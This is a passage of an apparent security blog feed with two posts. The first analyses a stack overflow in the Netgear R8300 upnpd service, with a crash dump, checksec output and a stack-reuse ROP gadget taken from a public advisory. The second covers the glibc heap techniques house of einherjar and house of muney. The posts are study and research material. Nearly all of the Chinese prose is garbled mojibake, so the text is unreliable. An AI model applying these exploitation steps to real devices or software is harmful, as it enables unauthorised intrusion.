./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><blockquote><p>ä¸€å¼€å§‹å‚»å‘—äº†ï¼Œå¿˜è®°äº†ç”¨æˆ·æ¨¡å¼å¯ä»¥ç›´æ¥è°ƒè¯•ï¼Œç›´æ¥attach pidè°ƒè¯•è°ƒçš„æ˜¯qemuçš„è¿›ç¨‹ï¼ˆï¼‰</p></blockquote><p>mainå‡½æ•°ä¸­æœ‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">daemon</span>(<span class="number">1</span>, <span class="number">1</span>) == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">debug</span>(<span class="number">3</span>, <span class="string">&quot;Fail to run as daemon&quot;</span>);</span><br><span class="line">  v13 = _errno_location();</span><br><span class="line">  <span class="built_in">exit</span>(*v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>daemonä½¿å¾—å½“å‰è¿›ç¨‹ä¼šå˜æˆå®ˆæŠ¤è¿›ç¨‹å¹¶ä¿æŒå·¥ä½œç›®å½•ä¸å˜ï¼Œä½†æ˜¯è¿™ä¸ªä¼šè®©è¯¥è¿›ç¨‹è„±ç¦»gdbçš„æ§åˆ¶ï¼Œè€ƒè™‘nopæ‰ï¼ŒæˆåŠŸ~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> R0   <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R1   <span class="number">0xfffed504</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R2   <span class="number">0xfffed504</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R3   <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R4   <span class="number">0x61</span></span><br><span class="line"> R5   <span class="number">0xfffed500</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R6   <span class="number">0xfffed504</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R7   <span class="number">0xfffed500</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R8   <span class="number">0xfffed504</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R9   <span class="number">0x10ab</span></span><br><span class="line"> R10  <span class="number">0x1</span></span><br><span class="line"> R11  <span class="number">0xc4584</span> â—‚â€” <span class="number">7</span></span><br><span class="line"> R12  <span class="number">0x553dc</span> â€”â–¸ <span class="number">0xff60393c</span> â—‚â€” push &#123;r4, lr&#125; <span class="comment">/* 0xe92d4010 */</span></span><br><span class="line"> SP   <span class="number">0xfffeceb8</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> PC   <span class="number">0xff603954</span> â—‚â€” ldrb ip, [r3] <span class="comment">/* 0xe5d3c000 */</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / arm / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">0xff603948</span>    ldrb   r4, [r2]</span><br><span class="line">   <span class="number">0xff60394c</span>    cmp    r4, #<span class="number">0</span></span><br><span class="line">   <span class="number">0xff603950</span>    popeq  &#123;r4, pc&#125;</span><br><span class="line"> â–º <span class="number">0xff603954</span>    ldrb   ip, [r3]</span><br><span class="line">   <span class="number">0xff603958</span>    cmp    r4, ip</span><br><span class="line">   <span class="number">0xff60395c</span>    addeq  r2, r2, #<span class="number">1</span></span><br><span class="line">   <span class="number">0xff603960</span>    addeq  r3, r3, #<span class="number">1</span></span><br><span class="line">   <span class="number">0xff603964</span>    beq    #<span class="number">0xff603948</span>                   &lt;<span class="number">0xff603948</span>&gt;</span><br><span class="line">    â†“</span><br><span class="line">   <span class="number">0xff603948</span>    ldrb   r4, [r2]</span><br><span class="line">   <span class="number">0xff60394c</span>    cmp    r4, #<span class="number">0</span></span><br><span class="line">   <span class="number">0xff603950</span>    popeq  &#123;r4, pc&#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ sp <span class="number">0xfffeceb8</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>â”‚    <span class="number">0xfffecebc</span> â€”â–¸ <span class="number">0xb62c</span> â—‚â€” subs r7, r0, #<span class="number">0</span> <span class="comment">/* 0xe2507000 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>â”‚    <span class="number">0xfffecec0</span> â€”â–¸ <span class="number">0xfffedefd</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>câ”‚    <span class="number">0xfffecec4</span> â€”â–¸ <span class="number">0xfffed574</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>â”‚    <span class="number">0xfffecec8</span> â€”â–¸ <span class="number">0x8df9</span> â—‚â€” <span class="number">0xad</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>â”‚    <span class="number">0xfffececc</span> â€”â–¸ <span class="number">0xfffef5f4</span> â—‚â€” mrchs p9, #<span class="number">1</span>, r3, c2, c1, #<span class="number">1</span> <span class="comment">/* 0x2e323931; &#x27;192.168.122.1&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>â”‚    <span class="number">0xfffeced0</span> â€”â–¸ <span class="number">0xfffed500</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>câ”‚    <span class="number">0xfffeced4</span> â€”â–¸ <span class="number">0x25e80</span> â—‚â€” subs sl, r0, #<span class="number">0</span> <span class="comment">/* 0xe250a000 */</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span> <span class="number">0xff603954</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br></pre></td></tr></table></figure><p>å‘é€å¤§é‡æ•°æ®å°±æˆåŠŸå‘ç°æ ˆæº¢å‡ºæ¼æ´</p><p>æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frimware/_R8300-V1<span class="number">.0</span><span class="number">.2</span><span class="number">.130</span>_1<span class="number">.0</span><span class="number">.99</span>.chk.extracted/squashfs-root </span><br><span class="line">&gt; checksec ./usr/sbin/upnpd     </span><br><span class="line">[*] <span class="string">&#x27;/home/s1nec-1o/frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/usr/sbin/upnpd&#x27;</span></span><br><span class="line">    Arch:     arm<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8000</span>)</span></span></span><br></pre></td></tr></table></figure><p>æ²¡pieï¼Œå°±å¯ç”¨äº†nx</p><p><code>SSD</code> å…¬å¼€çš„<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">æ¼æ´ç»†èŠ‚</a>ä¸­ç»™å‡ºäº†ä¸€ä¸ªæ–¹æ¡ˆï¼šé€šè¿‡ <code>stack reuse</code> çš„æ–¹å¼æ¥ç»•è¿‡è¯¥é™åˆ¶ã€‚å…·ä½“æ€è·¯ä¸ºï¼Œå…ˆé€šè¿‡ <code>socket</code> å‘é€ç¬¬ä¸€æ¬¡æ•°æ®ï¼Œå¾€æ ˆä¸Šå¡«å……ç›¸åº”çš„ <code>rop payload</code>ï¼ŒåŒæ—¶ä¿è¯ä¸ä¼šé€ æˆç¨‹åºå´©æºƒï¼›å†é€šè¿‡ <code>socket</code> å‘é€ç¬¬äºŒæ¬¡æ•°æ®ç”¨äºè¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€ï¼Œå¡«å……çš„è¿”å›åœ°å€ç”¨æ¥å®ç° <code>stack pivot</code>ï¼Œå³åŠ«æŒæ ˆæŒ‡é’ˆä½¿å…¶æŒ‡å‘ç¬¬ä¸€æ¬¡å‘é€çš„ <code>payload</code> å¤„ï¼Œç„¶åå†å¤ç”¨ä¹‹å‰çš„ <code>payload</code> ä»¥å®Œæˆæ¼æ´åˆ©ç”¨ã€‚<code>SSD</code> å…¬å¼€çš„æ¼æ´ç»†èŠ‚ä¸­çš„ç¤ºæ„å›¾å¦‚ä¸‹ã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503031630752.png" alt="image-20250301114232391" style="zoom:50%;" /><p>è¿™é‡Œå€Ÿç”¨çš„ROPæœ‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000230F</span>0                 ADD             SP, SP, #<span class="number">0x20C</span></span><br><span class="line">.text:<span class="number">000230F</span>4                 ADD             SP, SP, #<span class="number">0x1000</span></span><br><span class="line">.text:<span class="number">000230F</span>8                 POP             &#123;R4-R11,PC&#125;</span><br></pre></td></tr></table></figure><p>å‡æ ˆå¹¶ä¸”popå‡ºæ‰€æœ‰å…³é”®å¯„å­˜å™¨ï¼Œå¦‚æ­¤åªéœ€è¦æå‰æ„é€ å¥½å¯¹åº”çš„payloadå°±å¯ä»¥è¿›è¡ŒROPå•¦ï¼</p><p>è¿™ä¸ªåˆ©ç”¨çš„æ‰‹æ³•ä½¿å¾—ä¸€äº›ç®€å•çš„æ ˆæº¢å‡ºéƒ½èƒ½å˜å¾—å¾ˆå±é™©ï¼ˆå­¦åˆ°æƒ¹ï¼‰</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.iotsec-zone.com/article/202">cyberangle</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">åŸä½œè€…</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å›ºä»¶ä¸‹çš„how2hook-how2patch&quot;&gt;&lt;a href=&quot;#å›ºä»¶ä¸‹çš„how2hook-how2patch&quot; class=&quot;headerlink&quot; title=&quot;å›ºä»¶ä¸‹çš„how2hook &amp;amp; how2patch&quot;&gt;&lt;/a&gt;å›ºä»¶ä¸‹çš„how2hook &amp;</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="http://s1nec-1o.github.io/2025/02/21/how2heap/"/>
    <id>http://s1nec-1o.github.io/2025/02/21/how2heap/</id>
    <published>2025-02-21T12:41:20.000Z</published>
    <updated>2025-02-21T12:52:11.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-ofæ‰‹æ³•"><a href="#house-ofæ‰‹æ³•" class="headerlink" title="house ofæ‰‹æ³•"></a>house ofæ‰‹æ³•</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>house ofçš„æ‰‹æ³•åªéœ€ç†è§£å…¶ä¸­çš„æŠ€å·§ï¼Œäº†è§£å¦‚ä½•ä»å°å°çš„æ¼æ´è·å¾—rce</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>æº¢å‡ºå†™ã€<code>off by one</code>ã€<code>off by null</code></p><h3 id="é€‚ç”¨èŒƒå›´"><a href="#é€‚ç”¨èŒƒå›´" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯åˆ†é…å¤§äºå¤„äº <code>unsortedbin</code> çš„ <code>chunk</code></li></ul><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨ <code>off by null</code> ä¿®æ”¹æ‰ <code>chunk</code> çš„ <code>size</code> åŸŸçš„ <code>P</code> ä½ï¼Œç»•è¿‡ <code>unlink</code> æ£€æŸ¥ï¼Œåœ¨å †çš„åå‘åˆå¹¶è¿‡ç¨‹ä¸­æ„é€ å‡º <code>chunk overlapping</code>ã€‚</p><ul><li>ç”³è¯· <code>chunk Aã€chunk Bã€chunk Cã€chunk D</code>ï¼Œ<code>chunk D</code> ç”¨æ¥åš <code>gap</code>ï¼Œ<code>chunk Aã€chunk C</code> éƒ½è¦å¤„äº <code>unsortedbin</code> èŒƒå›´</li><li>é‡Šæ”¾ <code>A</code>ï¼Œè¿›å…¥ <code>unsortedbin</code></li><li>å¯¹ <code>B</code> å†™æ“ä½œçš„æ—¶å€™å­˜åœ¨ <code>off by null</code>ï¼Œä¿®æ”¹äº† <code>C</code> çš„ <code>P</code> ä½</li><li>é‡Šæ”¾ <code>C</code> çš„æ—¶å€™ï¼Œå †åå‘åˆå¹¶ï¼Œç›´æ¥æŠŠ <code>Aã€Bã€C</code> ä¸‰å—å†…å­˜åˆå¹¶ä¸ºäº†ä¸€ä¸ª <code>chunk</code>ï¼Œå¹¶æ”¾åˆ°äº† <code>unsortedbin</code> é‡Œé¢</li><li>è¯»å†™åˆå¹¶åçš„å¤§ <code>chunk</code> å¯ä»¥æ“ä½œ <code>chunk B</code> çš„å†…å®¹ï¼Œ<code>chunk B</code> çš„å¤´</li></ul><h3 id="ç›¸å…³æŠ€å·§"><a href="#ç›¸å…³æŠ€å·§" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>è™½ç„¶è¯¥åˆ©ç”¨æŠ€å·§è‡³ä»Šä»å¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯éœ€è¦å¯¹ <code>unlink</code> ç»•è¿‡çš„æ¡ä»¶éšç€ç‰ˆæœ¬çš„å¢åŠ æœ‰æ‰€å˜åŒ–ã€‚</p><p>æœ€å¼€å§‹çš„ <code>unlink</code> çš„ä»£ç æ˜¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta"><span class="comment">// .....      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure><p>åªéœ€è¦ç»•è¿‡<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> å³å¯ï¼Œå› æ­¤ï¼Œä¸éœ€è¦ä¼ªé€ åœ°å€å¤„äºé«˜ä½çš„ <code>chunk</code> çš„ <code>presize</code> åŸŸã€‚</p><p>é«˜ç‰ˆæœ¬çš„ <code>unlink</code> çš„æ¡ä»¶æ˜¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))  <span class="comment">//new</span></span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–°å¢äº† <code>chunksize (p) != prev_size (next_chunk (p))</code>ï¼Œå¯¹ <code>chunksize</code> æœ‰äº†æ£€æŸ¥ï¼Œä¼ªé€ çš„æ—¶å€™éœ€è¦ç»•è¿‡ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ"><a href="#åˆ©ç”¨æ•ˆæœ" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ„é€  <code>chunk overlap</code> åï¼Œå¯ä»¥ä»»æ„åœ°å€åˆ†é…</li><li>ç»“åˆå…¶ä»–æ–¹æ³•è¿›è¡Œä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="House-of-muney"><a href="#House-of-muney" class="headerlink" title="House of muney"></a>House of muney</h2><h3 id="åˆ©ç”¨ç‰ˆæœ¬"><a href="#åˆ©ç”¨ç‰ˆæœ¬" class="headerlink" title="åˆ©ç”¨ç‰ˆæœ¬"></a>åˆ©ç”¨ç‰ˆæœ¬</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li></ul><p>è¿™é‡Œåˆ†æå‡½æ•°å»¶è¿Ÿç»‘å®šæœºåˆ¶ä¸­å†™å…¥çœŸå®åœ°å€çš„è¿‡ç¨‹</p><p>é¦–å…ˆ<code>push n;push m;jmp _dl_runtime_resolve_xsavec;</code></p><blockquote><p>næ˜¯å‡½æ•°åœ¨.rela.pltçš„ä½ç½®</p><p>mæ˜¯codebase</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;: endbr64</span><br><span class="line">   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;:       push   rbx</span><br><span class="line">   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;:       mov    rbx,rsp</span><br><span class="line">   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;:       and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;:      sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 &lt;_rtld_global_ro+432&gt;</span><br><span class="line">   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fd8d47 &lt;_dl_runtime_resolve_xsavec+23&gt;:      mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fd8d4c &lt;_dl_runtime_resolve_xsavec+28&gt;:      mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x7ffff7fd8d51 &lt;_dl_runtime_resolve_xsavec+33&gt;:      mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x7ffff7fd8d56 &lt;_dl_runtime_resolve_xsavec+38&gt;:      mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">   0x7ffff7fd8d5b &lt;_dl_runtime_resolve_xsavec+43&gt;:      mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x7ffff7fd8d60 &lt;_dl_runtime_resolve_xsavec+48&gt;:      mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x7ffff7fd8d65 &lt;_dl_runtime_resolve_xsavec+53&gt;:      mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8d6a &lt;_dl_runtime_resolve_xsavec+58&gt;:      xor    edx,edx</span><br><span class="line">   0x7ffff7fd8d6c &lt;_dl_runtime_resolve_xsavec+60&gt;:      mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x7ffff7fd8d74 &lt;_dl_runtime_resolve_xsavec+68&gt;:      mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x7ffff7fd8d7c &lt;_dl_runtime_resolve_xsavec+76&gt;:      mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x7ffff7fd8d84 &lt;_dl_runtime_resolve_xsavec+84&gt;:      mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x7ffff7fd8d8c &lt;_dl_runtime_resolve_xsavec+92&gt;:      mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x7ffff7fd8d94 &lt;_dl_runtime_resolve_xsavec+100&gt;:     mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">   0x7ffff7fd8d9c &lt;_dl_runtime_resolve_xsavec+108&gt;:     xsavec [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8da1 &lt;_dl_runtime_resolve_xsavec+113&gt;:     mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x7ffff7fd8da5 &lt;_dl_runtime_resolve_xsavec+117&gt;:     mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x7ffff7fd8da9 &lt;_dl_runtime_resolve_xsavec+121&gt;:     call   0x7ffff7fd5e70 &lt;_dl_fixup&gt;</span><br><span class="line">   0x7ffff7fd8dae &lt;_dl_runtime_resolve_xsavec+126&gt;:     mov    r11,rax</span><br><span class="line">   0x7ffff7fd8db1 &lt;_dl_runtime_resolve_xsavec+129&gt;:     mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8db6 &lt;_dl_runtime_resolve_xsavec+134&gt;:     xor    edx,edx</span><br><span class="line">   0x7ffff7fd8db8 &lt;_dl_runtime_resolve_xsavec+136&gt;:     xrstor [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8dbd &lt;_dl_runtime_resolve_xsavec+141&gt;:     mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x7ffff7fd8dc2 &lt;_dl_runtime_resolve_xsavec+146&gt;:     mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x7ffff7fd8dc7 &lt;_dl_runtime_resolve_xsavec+151&gt;:     mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x7ffff7fd8dcc &lt;_dl_runtime_resolve_xsavec+156&gt;:     mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x7ffff7fd8dd1 &lt;_dl_runtime_resolve_xsavec+161&gt;:     mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x7ffff7fd8dd6 &lt;_dl_runtime_resolve_xsavec+166&gt;:     